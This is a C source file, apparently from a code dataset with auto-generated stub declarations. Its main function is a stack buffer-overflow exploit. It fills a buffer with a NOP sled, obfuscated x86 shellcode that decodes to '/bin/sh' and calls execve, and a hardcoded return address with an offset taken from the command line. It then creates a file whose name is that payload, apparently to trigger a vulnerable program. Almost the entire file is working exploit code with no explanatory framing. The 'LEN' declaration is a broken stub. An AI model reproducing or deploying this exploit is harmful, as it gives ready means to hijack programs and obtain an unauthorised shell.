
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int LEN ;
 int O_CREAT ;
 scalar_t__ atoi (char*) ;
 int close (int) ;
 int fprintf (int ,char*,int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,char,int) ;
 int open (char*,int ) ;
 int perror (char*) ;
 int stderr ;
 int strlen (char*) ;

int main (int argc, char **argv)
{
  char buf[LEN + 12];
  int ret = 0xbffffa80;
  int *p;
  int fp;

  char code[]=
  "\xeb\x29"

  "\x5e"
  "\x29\xc9"
  "\x89\xf3"
  "\x89\x5e\x08"
  "\xb1\x07"

  "\x80\x03\x20"
  "\x43"
  "\xe0\xfa"
  "\x29\xc0"
  "\x88\x46\x07"
  "\x89\x46\x0c"
  "\xb0\x0b"
  "\x87\xf3"
  "\x8d\x4b\x08"
  "\x8d\x53\x0c"
  "\xcd\x80"
  "\x29\xc0"
  "\x40"
  "\xcd\x80"

  "\xe8\xd2\xff\xff\xff"
  "\x0f\x42\x49\x4e\x0f\x53\x48";



  if (argc > 1) {
    ret += atoi(argv[1]);
    fprintf(stderr, "Using ret %#010x\n", ret);
  }

  memset(buf, '\x90', LEN);
  memcpy(buf + LEN - strlen(code), code, strlen(code));

  p = (int *) (buf + LEN);

  *p++ = ret;
  *p++ = ret;
  *p = 0;

  fp = open(buf, O_CREAT);
  if(fp < 0) perror("buf");
  close(fp);

}
